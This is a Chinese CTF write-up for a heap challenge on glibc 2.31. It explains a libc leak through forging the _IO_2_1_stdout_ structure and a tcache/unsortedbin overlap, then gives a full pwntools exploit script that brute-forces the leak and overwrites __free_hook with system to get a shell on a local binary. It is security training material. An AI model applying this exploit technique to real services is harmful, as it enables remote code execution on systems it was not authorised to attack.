# _IO_2_1_stdout_泄露
通过篡改_IO_2_1_stdout_结构体中的flags字段和_IO_write_base字段，通过篡改flags字段来绕过一些检查，通过篡改_IO_write_base字段使得当下次put函数系统调用write打印_IO_write_base字段与_IO_write_ptr字段之间的内容泄露出libc地址。
1.  申请到stdout(最普遍就说fastbin的fd和tcache的fd)
2. 使得unsortbin的fd出现到对应fastbin的fd或tcache的fd
3. stdout结构体地址的后三位是固定的，但是倒数第四位会因为ASLR的原因而随机化，可我们只能写入两字节，无法写入一个半字节，因此倒数第四位只能通过爆破来预测

# 漏洞
只能分配size在0x50~0x70的堆，chunk数组的下标为15以内
可利用数组越界往tcache的存的bin的地址对应的堆块写入东西（等价于edit after free 修改free后的chunk的fd），同时没有show，需要通过stdout_leak泄露libc


# 利用
- 需要tcache上的bin的起始的chunk存在libc残留地址，这样当数组越界才可以修改爆破
- 可以先修改free后的chunk残留的堆地址，使得得到的chunk能够修改下一个chunk的size大于fastbin，那么当free该chunk就能进入


1. 分配多个chunk，释放第一个和最后一个，修改后一个进入tcache的fd使得对应的chunk能够包括原来第二个chunk的头部
2. malloc两次，第二次修改第二个chunk的头部的size大于smallbin
3. 然后free第三个和第四个chunk进入tcache，free第二个chunk进入unsortedbin
4. 此时malloc小于第三个和第四个的chunk大小，此时usortedbin分割，由于是unsortedbin唯一一个chunk，此时分割后残留部分仍然在unsortedbin中，并且分割要使得恰好最后其地址与第四个chunk的地址重合
5. 此时利用数组越界修改第四个chunk的尾部字节爆破，并malloc两次，使得最后得到stdout的chunk
6. 构造stdout的相关参数，并泄露libc基地址
7. 最后再free两个chunk，修改第二个chunk的fd为free_hook的地址，第一次malloc布置好/bin/sh，第二次malloc修改free_hook的值为system
8. 最后free先malloc出来的chunk即可getshell

```python
from pwn import *

context(arch="amd64")
libc = ELF('./libc-2.31.so')
#gdb.attach(p)

def add(index,size,content):
    p.sendlineafter("is:",b"1")
    p.recvuntil(b"index:")
    p.sendline(str(index))
    p.recvuntil(b"size:")
    p.sendline(str(size))
    p.recvuntil(b"content:")
    p.sendline(content) 

def dele(index):
    p.sendlineafter("is:",b"2")
    p.recvuntil(b"index?")
    p.sendline(str(index))

def edit(index,content):
    p.sendlineafter("is:",b"3")
    p.recvuntil(b"index?")
    p.sendline(str(index))
    p.recvuntil(b"new content:")
    p.sendline(content)

def pwn():
    add(0,0x70," ")
    add(1,0x50," ")
    add(2,0x50," ")
    add(3,0x50," ")
    add(4,0x50," ")
    add(5,0x60," ")
    add(6,0x60," ")
    add(7,0x70," ") 
    add(8,0x70," ")
    add(9,0x70," ")
    add(10,0x70," ") #0x460
    add(13,0x70," ") #防止合并
    # 先free 第0个和第8个
    dele(0)
    dele(10)
    edit(-0x3c,b"\xb0")  # 修改第8个的fd为 chunk0+0x10或者更多
    add(10,0x70," ")
    payload=0x60*b"\x11"+p64(0)+p64(0x461)
    add(0,0x70,payload) # 9覆盖到了chunk1 payload修改chunk1的size为0x480

    dele(1)
    dele(6)
    dele(5)
    add(1,0x70,"")
    add(6,0x70,"")
    add(5,0x70,"")

    edit(-0x3d,p16(0x16a0)) #修改残留的libc的低两个字节

    add(11,0x60,"")

    payload=p64(0xfbad1800)+p64(0)*3 +p8(0)
    add(12,0x60,payload) #拿到IO_STDOUT,并修改
    
    # 接受泄漏的libc
    context.log_level='debug' 
    data = p.recvuntil(b'\x7f',timeout=0.5)#防止爆破时候正常返回菜单但没有爆破到stdout上
    print("recv ",data)
    libc.address = u64(data[-6:].ljust(8, b'\x00')) - libc.sym['_IO_2_1_stdin_']

    print("recv ",hex(u64(data[-6:].ljust(8, b'\x00'))))
 
    print("recv ",hex(libc.address))
    
    dele(7)
    dele(8)
    gdb.attach(p) #正确的进程便开始调试查看
    payload=p64(libc.sym['__free_hook']-8)
    edit(-0x3c,payload) #修改fd为hook-8
   
    payload=b"/bin/sh\x00"+p64(libc.sym['system'])
    add(7,0x70,"")
    add(8,0x70,payload) #/bin/sh system地址
    dele(8) #即可getshell
    p.interactive()



while True:
    try:
        p=process("./pwn4")
        print('Try...')
        pwn()
    except Exception  as e:
        print("发生错误:", type(e).__name__)
        print("错误详情:", e)
        
    except:
        p.close()

"""
```
